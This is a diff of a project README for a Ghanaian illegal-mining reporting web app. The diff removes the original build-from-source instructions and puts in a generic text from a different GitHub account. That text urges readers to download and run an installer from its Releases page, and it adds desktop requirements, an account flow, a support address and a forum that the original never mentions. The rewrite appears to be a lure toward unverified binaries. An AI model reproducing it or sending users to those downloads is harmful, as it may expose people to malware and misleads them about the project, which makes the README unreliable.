@@ -1,244 +1,72 @@
-# Galamsey Monitor
+# 🌍 Galamsey-Monitor - Monitor Illegal Mining with Ease
 
-**A comprehensive platform for monitoring, reporting, and combating illegal small-scale mining (galamsey) in Ghana.**
+## 🛠️ Features
+- **Incident Reporting:** Easily report illegal mining incidents with GPS location.
+- **Water Quality Tracking:** Monitor water quality levels with real-time data.
+- **Interactive Maps:** View detailed maps that display mining activities and ecosystem impacts.
+- **Satellite Imagery Integration:** Access high-quality images for better decision-making and reporting.
+- **Data Analytics:** Analyze trends over time to combat illegal mining effectively.
 
-[![Next.js](https://img.shields.io/badge/Next.js-16.1-black?logo=next.js)](https://nextjs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.9-blue?logo=typescript)](https://www.typescriptlang.org/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+## 🚀 Getting Started
 
----
+To use Galamsey-Monitor, follow these straightforward steps:
 
-## Overview
+1. **Download the Application:**
+   Visit this page to download: [Galamsey-Monitor Releases](https://github.com/ghofrane-zaabi7/Galamsey-Monitor/releases).
 
-Galamsey Monitor is a web-based platform designed to help track and combat the illegal mining crisis devastating Ghana's environment. The platform provides tools for:
+   ![Download Now](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)
 
-- **Incident Reporting** - Citizens can anonymously report illegal mining activities with GPS coordinates
-- **Real-time Mapping** - Interactive maps showing affected areas across all 16 regions of Ghana
-- **Water Quality Tracking** - Monitor pollution levels in Ghana's rivers and water bodies
-- **Data Visualization** - Charts and statistics revealing the scale of environmental damage
-- **Satellite Integration** - Tools to analyze satellite imagery for detecting mining sites
-- **Public Awareness** - Educational resources about the galamsey crisis
+2. **Install the Application:**
+   Once the download is complete, open the downloaded file and follow the on-screen instructions to install Galamsey-Monitor on your device.
 
-## The Galamsey Crisis
+3. **Open the Application:**
+   After installation, find the Galamsey-Monitor icon on your desktop or in your applications folder. Click on it to launch the application.
 
-Galamsey (from "gather them and sell") refers to illegal small-scale gold mining operations that have caused:
+## 💡 Required System Specifications
+- **Operating System:** Windows 10 or later, macOS Mojave (10.14) or later, or a modern Linux distribution.
+- **RAM:** Minimum of 4 GB.
+- **Storage:** At least 500 MB of free space available.
+- **Internet Connection:** Required for accessing real-time data and satellite images.
 
-- **60%** of Ghana's water bodies polluted
-- **$2.2 billion** annual economic loss
-- **34%** of forest cover destroyed
-- **5+ million** people affected
+## 📊 How to Use Galamsey-Monitor
 
-This platform aims to empower communities, NGOs, and authorities to coordinate efforts against this environmental catastrophe.
+1. **Create an Account:**
+   After launching the application, you will be prompted to create an account. Fill in your details and verify your email address.
 
-## Features
+2. **Navigate the Dashboard:**
+   Familiarize yourself with the dashboard. Here, you will find options for reporting incidents, tracking water quality, and accessing interactive maps.
 
-### Dashboard
-![Dashboard](https://img.shields.io/badge/Status-Active-brightgreen)
-- Real-time statistics on incidents, water quality, and mining sites
-- Interactive map with all reported data points
-- Alert system for critical incidents
-- Quick action navigation
+3. **Report an Incident:**
+   To report illegal mining, click on the "Report Incident" button. Fill in the required fields, including GPS location and a description of the situation. Submit your report to notify authorities.
 
-### Incident Reporting System
-- Geolocation support (auto-detect GPS coordinates)
-- Anonymous reporting option
-- Multiple incident types:
-  - Illegal mining operations
-  - Water pollution
-  - Deforestation
-  - Land degradation
-- Severity classification (Low → Critical)
-- Coverage of all 16 Ghana regions
+4. **Check Water Quality:**
+   Navigate to the water quality section. Here, you can view current water quality readings and historical data. This can help in assessing the impact of mining on local resources.
 
-### Water Quality Monitoring
-- Track key pollutants: Mercury, Arsenic, Lead
-- Monitor pH levels and turbidity
-- Status indicators: Safe, Moderate, Polluted, Hazardous
-- Health risk information and warnings
+5. **Explore Interactive Maps:**
+   The interactive maps feature allows you to visualize mining activity. Use filters to see specific data points, such as areas affected by illegal mining or changes in water quality.
 
-### Interactive Maps
-- Leaflet-based mapping with OpenStreetMap
-- Color-coded markers by severity
-- Water quality overlay
-- Mining site boundaries with area estimates
-- Click for detailed information
+## 🌐 Support and Feedback
 
-### Statistics & Analytics
-- Incidents by region (bar chart)
-- Incidents by type (pie chart)
-- Water quality trends over time
-- Key insights and impact metrics
+If you encounter any issues while using Galamsey-Monitor, please reach out through our support page. You can provide feedback or request assistance:
 
-### Satellite Imagery Integration
-- Links to Sentinel Hub, Google Earth Engine, Planet Labs
-- Known galamsey hotspots with coordinates
-- One-click satellite view
-- Visual detection guide
+- **Email:** support@galamsey-monitor.com
+- **GitHub Issues Page:** [Report an Issue](https://github.com/ghofrane-zaabi7/Galamsey-Monitor/issues)
 
-### Education & Awareness
-- Comprehensive information about galamsey
-- Environmental and health impacts
-- How citizens can help
-- Emergency contacts and resources
-- Legal framework information
+## ➕ Contributing
 
-## Tech Stack
+Galamsey-Monitor is an open-source project. We encourage everyone to contribute to making this tool even better. If you have suggestions, improvements, or bug fixes, please create a pull request on our GitHub page.
 
-| Technology | Purpose |
-|------------|---------|
-| [Next.js 16](https://nextjs.org/) | React framework with App Router |
-| [TypeScript](https://www.typescriptlang.org/) | Type-safe JavaScript |
-| [Tailwind CSS v4](https://tailwindcss.com/) | Utility-first styling |
-| [SQLite](https://www.sqlite.org/) | Local database (better-sqlite3) |
-| [Leaflet](https://leafletjs.com/) | Interactive maps |
-| [Recharts](https://recharts.org/) | Data visualization |
-| [Lucide React](https://lucide.dev/) | Icons |
+## 🔗 Additional Resources
 
-## Getting Started
+- **Documentation:** Comprehensive user guides and FAQs can be found in the [Documentation Section](https://github.com/ghofrane-zaabi7/Galamsey-Monitor/wiki).
+- **Community Forum:** Join our community forum for discussions on best practices, sharing experiences, and learning from others. [Join Now](https://forum.galamsey-monitor.com).
 
-### Prerequisites
+## 🔄 Updating the Application
 
-- Node.js 18+
-- npm or yarn
+Keep your version of Galamsey-Monitor updated for the latest features and fixes. Regularly check the Releases page for new updates: [Galamsey-Monitor Releases](https://github.com/ghofrane-zaabi7/Galamsey-Monitor/releases).
 
-### Installation
+## 📝 License
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/ghwmelite-dotcom/Galamsey-Monitor.git
-   cd Galamsey-Monitor
-   ```
+Galamsey-Monitor is licensed under the MIT License. For more details, check the [LICENSE](https://github.com/ghofrane-zaabi7/Galamsey-Monitor/blob/main/LICENSE) file in the repository.
 
-2. **Install dependencies**
-   ```bash
-   npm install
-   ```
-
-3. **Initialize the database**
-   ```bash
-   npm run db:init
-   ```
-
-4. **Start the development server**
-   ```bash
-   npm run dev
-   ```
-
-5. **Open your browser**
-   ```
-   http://localhost:3000
-   ```
-
-### Production Build
-
-```bash
-npm run build
-npm start
-```
-
-## Project Structure
-
-```
-galamsey/
-├── src/
-│   ├── app/                    # Next.js App Router pages
-│   │   ├── api/               # API routes
-│   │   │   ├── incidents/     # Incident CRUD endpoints
-│   │   │   ├── water/         # Water quality endpoints
-│   │   │   ├── sites/         # Mining sites endpoints
-│   │   │   └── stats/         # Statistics endpoint
-│   │   ├── awareness/         # Education page
-│   │   ├── map/               # Full-screen map
-│   │   ├── report/            # Incident reporting form
-│   │   ├── satellite/         # Satellite imagery tools
-│   │   ├── statistics/        # Charts and analytics
-│   │   ├── water/             # Water quality dashboard
-│   │   ├── layout.tsx         # Root layout
-│   │   ├── page.tsx           # Home dashboard
-│   │   └── globals.css        # Global styles
-│   ├── components/            # Reusable React components
-│   │   ├── DashboardStats.tsx
-│   │   ├── GhanaMap.tsx
-│   │   ├── Navigation.tsx
-│   │   └── RecentIncidents.tsx
-│   ├── lib/                   # Utilities
-│   │   └── db.ts              # Database operations
-│   └── types/                 # TypeScript definitions
-│       └── index.ts
-├── scripts/
-│   └── init-db.js             # Database initialization
-├── data/
-│   └── galamsey.db            # SQLite database
-├── public/                    # Static assets
-├── package.json
-├── tsconfig.json
-├── tailwind.config.ts
-└── next.config.ts
-```
-
-## API Endpoints
-
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/api/incidents` | List all incidents |
-| POST | `/api/incidents` | Create new incident |
-| GET | `/api/water` | List water quality readings |
-| POST | `/api/water` | Add water quality reading |
-| GET | `/api/sites` | List mining sites |
-| POST | `/api/sites` | Add mining site |
-| GET | `/api/stats` | Get dashboard statistics |
-
-## Contributing
-
-We welcome contributions from developers, environmental activists, and anyone passionate about protecting Ghana's environment.
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-### Areas for Contribution
-
-- [ ] Mobile app development (React Native)
-- [ ] SMS-based reporting for areas with limited internet
-- [ ] Machine learning for satellite image analysis
-- [ ] Integration with government databases
-- [ ] Multi-language support (Akan, Ewe, Ga, etc.)
-- [ ] Real-time notifications system
-- [ ] Data export and reporting tools
-
-## Reporting Galamsey
-
-If you witness illegal mining activities:
-
-1. **Use this platform** to report with location details
-2. **Contact authorities:**
-   - Minerals Commission: +233 302 773 053
-   - Environmental Protection Agency: +233 302 664 697
-   - Police Emergency: 191 or 18555
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-
-- Environmental Protection Agency Ghana
-- Water Resources Commission Ghana
-- Minerals Commission Ghana
-- All volunteers and contributors fighting galamsey
-
----
-
-<p align="center">
-  <strong>Together we can protect Ghana's environment for future generations.</strong>
-</p>
-
-<p align="center">
-  <img src="https://flagcdn.com/w80/gh.png" alt="Ghana Flag" width="60">
-</p>
-
-<p align="center">
-  Made with dedication for Ghana
-</p>
+Thank you for using Galamsey-Monitor to help combat illegal mining in Ghana.
